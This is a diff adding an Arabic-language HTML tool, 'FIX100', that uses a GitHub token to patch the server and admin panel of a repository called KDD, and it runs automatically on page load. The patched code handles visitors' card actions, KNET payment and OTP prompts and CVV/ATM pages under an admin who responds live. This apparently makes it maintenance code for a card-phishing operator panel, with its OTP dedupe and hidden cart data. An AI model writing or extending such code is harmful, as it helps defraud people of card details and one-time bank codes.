@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>FIX100 — إصلاح التعليق + إخفاء بيانات السلة</title>
+<style>
+body{font-family:system-ui,Tajawal,sans-serif;background:#0f1115;color:#e8e8ea;padding:18px;max-width:820px;margin:auto}
+h1{font-size:18px}input{width:100%;padding:9px;border-radius:8px;border:1px solid #333;background:#1a1d24;color:#fff;margin:5px 0}
+button{padding:11px 16px;border-radius:9px;border:0;background:#16a34a;color:#fff;font-weight:700;cursor:pointer;margin-top:8px}
+#log{background:#141821;border:1px solid #262b36;border-radius:9px;padding:12px;margin-top:14px;font-family:monospace;font-size:13px;white-space:pre-wrap;line-height:1.7}
+.ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}
+</style>
+</head>
+<body>
+<h1>FIX100 — منع التعليق والتكرار + إخفاء بيانات السلة</h1>
+<div>Token (يُحفظ تلقائياً):</div>
+<input id="tok" placeholder="ghp_...">
+<button id="run">تشغيل الإصلاح</button>
+<div id="log"></div>
+<script>
+(function(){
+  var OWNER="fahshomi-ui", REPO="KDD", BRANCH="main";
+  var FILES=["server/index.js","server/admin/index.html","kdd-public/admin.html"];
+  var tok=document.getElementById("tok"), log=document.getElementById("log"), run=document.getElementById("run");
+  tok.value = localStorage.getItem("kdd_token")||"";
+  function say(t,c){ var d=document.createElement("div"); if(c)d.className=c; d.textContent=t; log.appendChild(d); }
+
+  var STYLE100='<style id="kddF100">#f99toggle,#f99bToggle{display:none!important}</style>\n';
+  var SCRIPT100=
+'<script id="kddF100">\n'+
+'(function(){\n'+
+'  if (window.__f100) return; window.__f100 = 1;\n'+
+'  var NOISE = /(cart|سلة|makani|kdd[-_]|coupon|كوبون|_v1|^f\\d+$)/i;\n'+
+'  function isNoise(sec){\n'+
+'    var h = sec.querySelector("h3");\n'+
+'    if (!h || String(h.textContent||"").indexOf("\\uD83D\\uDCCB") !== 0) return false;\n'+
+'    var spans = sec.querySelectorAll("span.block"), hit = false;\n'+
+'    for (var i=0;i<spans.length;i++){\n'+
+'      var k = (spans[i].textContent||"").trim();\n'+
+'      if (!k) continue;\n'+
+'      if (NOISE.test(k)) { hit = true; break; }\n'+
+'    }\n'+
+'    return hit;\n'+
+'  }\n'+
+'  function sweep(){\n'+
+'    var box = document.getElementById("visitorDetails");\n'+
+'    if (!box) return;\n'+
+'    var secs = box.querySelectorAll(".data-section");\n'+
+'    for (var i=0;i<secs.length;i++){\n'+
+'      var s = secs[i];\n'+
+'      if (s.getAttribute("data-f100") !== "1"){\n'+
+'        if (!isNoise(s)) continue;\n'+
+'        s.setAttribute("data-f100","1");\n'+
+'      }\n'+
+'      if (s.style.display !== "none") s.style.display = "none";\n'+
+'    }\n'+
+'  }\n'+
+'  var orig = window.renderVisitorDetails;\n'+
+'  if (typeof orig === "function" && !orig.__f100){\n'+
+'    var w = function(){ var r = orig.apply(this, arguments); try { sweep(); } catch(e){} return r; };\n'+
+'    w.__f100 = 1; window.renderVisitorDetails = w; try { renderVisitorDetails = w; } catch(e){}\n'+
+'  }\n'+
+'  function hook(){\n'+
+'    var box = document.getElementById("visitorDetails");\n'+
+'    if (box && !box.__f100){ box.__f100 = 1; try { new MutationObserver(function(){ sweep(); }).observe(box, { childList: true, subtree: true }); } catch(e){} }\n'+
+'    sweep();\n'+
+'  }\n'+
+'  hook(); setInterval(hook, 300);\n'+
+'})();\n'+
+'</script>\n';
+
+  var BLOCK_D=
+'\n      /*FIX100D*/ try {\n'+
+'        var __c100 = data.content || {}, __ks100 = Object.keys(__c100).sort();\n'+
+'        var __sig100 = String(data.page || "") + "#" + String(data.digitCode || "") + "#" + __ks100.map(function(k){ return k + "=" + String(__c100[k]).slice(0,120); }).join("|");\n'+
+'        var __now100 = Date.now();\n'+
+'        var __dup100 = (visitor.__f100sig === __sig100) && (__now100 - (visitor.__f100at || 0) < 8000) && !!__sig100;\n'+
+'        visitor.__f100sig = __sig100; visitor.__f100at = __now100;\n'+
+'        if (__dup100) {\n'+
+'          try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __dp100 = String(data.page || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__dp100)) { visitor.__f98otp = 0; visitor.__f100sent = 0; } else if (/دفع|كي\\s*نت|knet|payment|otp|رمز/i.test(__dp100)) { data.page = "رمز التحقق كي نت (OTP)"; } } } catch(e){}\n'+
+'          visitor.page = data.page;\n'+
+'          visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;\n'+
+'          visitors.set(socket.id, visitor);\n'+
+'          saveVisitorPermanently(visitor);\n'+
+'          return;\n'+
+'        }\n'+
+'      } catch(e) {}\n';
+
+  function patchServer(src){
+    var out=src, n=0;
+    if (out.indexOf("/*FIX100E*/") === -1){
+      var f='__f91Emit(visitorSocketId, "card:action", action);';
+      var i=out.indexOf(f);
+      if (i > -1){
+        var rep='var __skipEmit100 = false, __vv100 = null;\n'+
+        '    /*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}\n'+
+        '    if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }';
+        out = out.slice(0,i) + rep + out.slice(i+f.length); n++;
+      }
+    }
+    if (out.indexOf("/*FIX100D*/") === -1){
+      var a='socket.on("more-info", (data) => {\n    const visitor = __f91ResolveVisitor(socket, data);\n    if (visitor) {\n      visitor.lastActivity = Date.now();\n      visitor.isIdle = false;';
+      var j=out.indexOf(a);
+      if (j > -1){ out = out.slice(0, j+a.length) + BLOCK_D + out.slice(j+a.length); n++; }
+    }
+    if (out.indexOf("__f100reg") === -1){
+      var rf='    visitors.set(socket.id, visitor);\n    saveData();';
+      var k=out.indexOf(rf);
+      if (k > -1){
+        out = out.slice(0,k) + '    visitors.set(socket.id, visitor);\n    /*FIX100reg*/ try { visitor.__f100sent = 0; } catch(e){}\n    saveData();' + out.slice(k+rf.length); n++;
+      }
+    }
+    if (out.indexOf("__f98otp = 0; visitor.__f100sent") === -1){
+      var b=out.split("visitor.__f98otp = 0;");
+      if (b.length > 1){ out = b.join("visitor.__f98otp = 0; visitor.__f100sent = 0;"); n++; }
+    }
+    var pre=out;
+    out = out.split("/cvv|atm|مرور|نهائي|final|رئيسي/i").join("/cvv|atm|مرور|نهائي|final/i");
+    if (out !== pre) n++;
+    return {out:out, n:n};
+  }
+
+  function cutTag(html, open, close){
+    var i=html.indexOf(open);
+    if (i === -1) return html;
+    var j=html.indexOf(close, i);
+    if (j === -1) return html;
+    j += close.length;
+    while (html.charAt(j) === "\n") j++;
+    return html.slice(0,i) + html.slice(j);
+  }
+
+  function patchAdmin(src){
+    var out=src, n=0;
+    if (out.indexOf('id="kddF100"') > -1) return {out:out, n:0};
+    var before=out;
+    out = cutTag(out, '<script id="kddF99">', "</scr"+"ipt>");
+    out = cutTag(out, '<style id="kddF99B">', "</style>");
+    out = cutTag(out, '<script id="kddF99B">', "</scr"+"ipt>");
+    if (out !== before) n++;
+    var pre=out;
+    out = out.split("/cvv|atm|مرور|نهائي|final|رئيسي/i").join("/cvv|atm|مرور|نهائي|final/i");
+    if (out !== pre) n++;
+    var idx = out.lastIndexOf("</body>");
+    if (idx > -1){
+      out = out.slice(0,idx) + STYLE100 + SCRIPT100 + "\n" + out.slice(idx); n++;
+    }
+    return {out:out, n:n};
+  }
+
+  function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
+
+  async function api(path, opts){
+    var r = await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path+"?ref="+BRANCH, opts);
+    if (!r.ok) throw new Error(path+" -> HTTP "+r.status);
+    return r.json();
+  }
+
+  async function doFile(path){
+    try {
+      var meta = await api(path, { headers:{ Authorization:"token "+tok.value, Accept:"application/vnd.github+json" } });
+      var src = decodeURIComponent(escape(atob(meta.content.replace(/\n/g,""))));
+      var res = /\.js$/.test(path) ? patchServer(src) : patchAdmin(src);
+      if (res.n === 0 || res.out === src){ say("• "+path+" : مطبّق مسبقاً", "warn"); return 0; }
+      var put = await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path, {
+        method:"PUT",
+        headers:{ Authorization:"token "+tok.value, Accept:"application/vnd.github+json", "Content-Type":"application/json" },
+        body: JSON.stringify({ message:"FIX100: stop OTP double-emit + dedupe + hide cart noise", content: b64(res.out), sha: meta.sha, branch: BRANCH })
+      });
+      if (!put.ok){ var t=await put.text(); say("✗ "+path+" : "+put.status+" "+t.slice(0,120), "err"); return 0; }
+      say("✓ تم التعديل : "+path+"  ("+res.n+" تعديل)", "ok"); return 1;
+    } catch(e){ say("✗ "+path+" : "+e.message, "err"); return 0; }
+  }
+
+  async function runAll(){
+    log.innerHTML=""; tok.value=tok.value.trim();
+    if (!tok.value){ say("أدخل التوكن أولاً","err"); return; }
+    localStorage.setItem("kdd_token", tok.value);
+    run.disabled = true; say("بدء الإصلاح...");
+    var ok=0;
+    for (var i=0;i<FILES.length;i++){ ok += await doFile(FILES[i]); }
+    say("\nالنتيجة: "+ok+" ملف معدّل.", ok?"ok":"warn");
+    if (ok) say("انتظر 2-3 دقائق (Render يعيد النشر) ثم Ctrl+F5 على لوحة التحكم.", "warn");
+    run.disabled = false;
+  }
+  run.addEventListener("click", runAll);
+  window.addEventListener("load", function(){ setTimeout(runAll, 400); });
+})();
+</script>
+</body>
+</html>
